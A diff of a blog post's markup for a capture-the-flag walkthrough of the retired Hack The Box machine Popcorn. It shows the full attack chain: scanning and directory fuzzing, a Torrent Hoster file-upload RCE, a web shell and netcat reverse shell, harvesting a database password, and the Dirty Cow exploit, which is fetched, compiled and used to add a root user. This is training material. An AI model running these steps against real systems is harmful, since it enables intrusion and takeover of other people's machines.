@@ -27,8 +27,7 @@ Working on another retired oldie.  Let's get to it.
 
 As per the usual, run nmap to get the open ports that we can investigate.
 
-{% raw %}
-```sh
+{% capture nmap %}
 └──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.6
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 08:53 CST
 Nmap scan report for 10.10.10.6
@@ -65,15 +64,18 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 28.89 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
+
 
 <br />
 Run nmap against all ports just to confirm that there are no weird ports running.
 
-{% raw %}
-```sh
-└──╼ [★]$ nmap -sC -sV -O -A -oN nmap 10.10.10.6
+{% capture nmapall %}
 └──╼ [★]$ sudo nmap -sS -p- -oN nmapfull 10.10.10.6
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-17 08:54 CST
 Nmap scan report for 10.10.10.6
@@ -84,20 +86,27 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapall %}
 
 <br />
 Noticing the redirect in the nmap output, add popcorn.htb to the /etc/hosts file.
 
-{% raw %}
-```sh
+{% capture hostsfile %}
 └──╼ [★]$ cat /etc/hosts
 127.0.0.1	localhost
 127.0.1.1	debian12-parrot
 10.10.10.6 popcorn.htb
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=hostsfile %}
 
 <br />
 Check the landing page for the web server and view its source.
@@ -108,22 +117,22 @@ Check the landing page for the web server and view its source.
     </div>
 </div>
 
-{% raw %}
-```html
-view-source:http://popcorn.htb/
-
+{% capture landingsource %}
 <html><body><h1>It works!</h1>
 <p>This is the default web page for this server.</p>
 <p>The web server software is running but no content has been added, yet.</p>
 </body></html>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="browser"
+   title="view-source:http://popcorn.htb/"
+   content=landingsource %}
 
 <br />
 Use ffuf to fuzz and brute-force directories that are hopefully more interesting the It works! page.
 
-{% raw %}
-```bash
+{% capture ffuf %}
 └──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://popcorn.htb/FUZZ -fw 22
 
         /'___\  /'___\           /'___\       
@@ -151,21 +160,28 @@ test                    [Status: 200, Size: 47400, Words: 2478, Lines: 655, Dura
 torrent                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 97ms]
 rename                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 97ms]
 :: Progress: [220560/220560] :: Job [1/1] :: 408 req/sec :: Duration: [0:09:18] :: Errors: 1 ::
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=ffuf %}
 
 <br />
 Investigate the /test folder and notice that it is the phpinfo() page.
 
-{% raw %}
-```bash
+{% capture phpinfo %}
 PHP Version 5.2.10-2ubuntu6.10
 
 System 	Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=phpinfo %}
 
 <br />
 Check the /rename folder.  It seem to describe how to use the Renamer API.  Might be interesting if we can't find something more useful.  Or a rabbit hole.  Anyway.
@@ -188,8 +204,7 @@ Check the /torrent directory.  Looks like some sort of torrent repository progra
 <br />
 Check the searchsploit for this torrent hoster program.
 
-{% raw %}
-```bash
+{% capture searchsploit %}
 └──╼ [★]$ searchsploit torrent hoster
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                                                                                              |  Path
@@ -197,8 +212,12 @@ Check the searchsploit for this torrent hoster program.
 Torrent Hoster - Remount Upload                                                                                                                             | php/webapps/11746.txt
 ------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=searchsploit %}
 
 <br />
 Search online for an exploit that we can use.  Come across this GitHub repository.
@@ -213,18 +232,20 @@ Search online for an exploit that we can use.  Come across this GitHub repositor
 <br />
 Start a netcat listener.
 
-{% raw %}
-```bash
+{% capture startlistener %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Download a copy to the local working folder.  Update the script as there is a format function attached to print funtion instead of the string inside the function.
 
-{% raw %}
-```python
+{% capture landingsource %}
 #!/usr/bin/env python
 
 <snip>
@@ -252,14 +273,17 @@ def parseTorrents(url):
 	return(torrents[0])
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="python"
+   title="torrent_hoster_unauthenticated_rce.py"
+   content=landingsource %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```bash
+{% capture runexploit %}
 └──╼ [★]$ python rce.py --url=http://popcorn.htb/torrent/
 
 <snip>
@@ -288,13 +312,19 @@ Traceback (most recent call last):
     command 	= raw_input("$ ")
                ^^^^^^^^^
 NameError: name 'raw_input' is not defined
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runexploit %}
 
 <br />
 Notice the error in the output.  Navigate to the url indicated in the Shell Uploaded: line.  For the c= parameter, use whoami to test remote code execution.
 
-<a href="http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami">http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami</a>
+<div class="info-box">
+  <a href="http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami">http://popcorn.htb/torrent//upload/d042db4335a8c8884da040e3ab4dc2df6c3efcea.php?c=whoami</a>
+</div>
 <div class="row justify-content-sm-center">
     <div class="col-sm mt-3 mt-md-0">
         {% include figure.liquid loading="eager" path="/assets/img/popcorn/testrce.png" title="Test the RCE" class="img-fluid rounded z-depth-1" %}
@@ -323,21 +353,23 @@ Update the c parameter with the payload from revshells.
 <br />
 Check the listener and catch the shell.  Use the python to upgrade the shell.
 
-{% raw %}
-```bash
+{% capture catchshell %}
 └──╼ [★]$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.6] 42132
 python -c 'import pty; pty.spawn("/bin/bash");'
 www-data@popcorn:/var/www/torrent/upload$ 
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Check the config.php file to get a potential password.
 
-{% raw %}
-```php
+{% capture configfile %}
 <?php
 
 <snip>
@@ -350,14 +382,17 @@ Check the config.php file to get a potential password.
   $CFG->dbPassword = "SuperSecret!!";	//db password
 
 ?>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="php"
+   title="config.php"
+   content=configfile %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```bash
+{% capture userflag %}
 www-data@popcorn:/home/george$ cat user.txt
 cat user.txt
 <redacted>
@@ -381,19 +416,26 @@ lo        Link encap:Local Loopback
           TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:14520 (14.5 KB)  TX bytes:14520 (14.5 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Run uname -a to get the version of Linux.
 
-{% raw %}
-```bash
+{% capture linuxversion %}
 www-data@popcorn:/dev/shm$ uname -a
 uname -a
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=linuxversion %}
 
 <br />
 This version of Linux is vulnerable to Dirty Cow privilege escalation exploit.
@@ -408,8 +450,7 @@ This version of Linux is vulnerable to Dirty Cow privilege escalation exploit.
 <br />
 Download the dirty payload.
 
-{% raw %}
-```bash
+{% capture downloaddirty %}
 └──╼ [★]$ wget https://www.exploit-db.com/raw/40839 -O dirty.c
 --2025-01-17 18:07:07--  https://www.exploit-db.com/raw/40839
 Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
@@ -421,23 +462,29 @@ Saving to: ‘dirty.c’
 dirty.c                                         100%[=====================================================================================================>]   4.89K  --.-KB/s    in 0s      
 
 2025-01-17 18:07:09 (102 MB/s) - ‘dirty.c’ saved [5006/5006]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloaddirty %}
 
 <br />
 Compile the exploit.
 
-{% raw %}
-```bash
+{% capture firstcompile %}
 └──╼ [★]$ gcc -pthread dirty.c -o dirty -lcrypt
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=firstcompile %}
 
 <br />
 Transfer the compiled exploit to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferbinary %}
 www-data@popcorn:/dev/shm$ wget http://10.10.14.29:8000/dirty
 wget http://10.10.14.29:8000/dirty
 --2025-01-18 02:10:33--  http://10.10.14.29:8000/dirty
@@ -452,25 +499,31 @@ Saving to: `dirty'
 
 www-data@popcorn:/dev/shm$ chmod +x dirty
 chmod +x dirty
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transferbinary %}
 
 <br />
 Try to run the exploit and notice the error.
 
-{% raw %}
-```bash
+{% capture runbinary %}
 www-data@popcorn:/dev/shm$ ./dirty
 ./dirty
 bash: ./dirty: cannot execute binary file
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runbinary %}
 
 <br />
 Transfer the dirty.c source file to the victim machine.
 
-{% raw %}
-```bash
+{% capture transferdirtycow %}
 www-data@popcorn:/dev/shm$ wget http://10.10.14.29:8000/dirty.c -O dirty.c
 wget http://10.10.14.29:8000/dirty.c -O dirty.c
 --2025-01-18 02:13:55--  http://10.10.14.29:8000/dirty.c
@@ -482,24 +535,30 @@ Saving to: `dirty.c'
 100%[======================================>] 5,006       --.-K/s   in 0s      
 
 2025-01-18 02:13:55 (396 MB/s) - `dirty.c' saved [5006/5006]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=transferdirtycow %}
 
 <br />
 Compile the source code on the victim machine.
 
-{% raw %}
-```bash
+{% capture compiledirtycow %}
 www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
 gcc -pthread dirty.c -o dirty -lcrypt
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=compiledirtycow %}
 
 <br />
 Run the dirty executable.
 
-{% raw %}
-```bash
+{% capture rundirtycow %}
 www-data@popcorn:/dev/shm$ gcc -pthread dirty.c -o dirty -lcrypt
 gcc -pthread dirty.c -o dirty -lcrypt
 www-data@popcorn:/dev/shm$ ./dirty
@@ -511,14 +570,17 @@ Complete line:
 firefart:fik57D3GJz/tk:0:0:pwned:/root:/bin/bash
 
 mmap: b789e000
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rundirtycow %}
 
 <br />
 Ssh in the victim as the new firefart user that was created by the Dirty Cow.
 
-{% raw %}
-```bash
+{% capture sshintomachine %}
 └──╼ [★]$ ssh -oHostKeyAlgorithms=+ssh-dss firefart@10.10.10.6
 firefart@10.10.10.6's password: 
 Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
@@ -535,14 +597,17 @@ http://help.ubuntu.com/
 
 Last login: Tue Nov 21 19:24:41 2023 from 10.10.14.23
 firefart@popcorn:~#
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sshintomachine %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```bash
+{% capture rootflag %}
 firefart@popcorn:~# cat /root/root.txt
 <redacted>
 firefart@popcorn:~# ifconfig
@@ -564,8 +629,12 @@ lo        Link encap:Local Loopback
           TX packets:96 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:0 
           RX bytes:14520 (14.5 KB)  TX bytes:14520 (14.5 KB)
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Sweet, delicious popcorn.
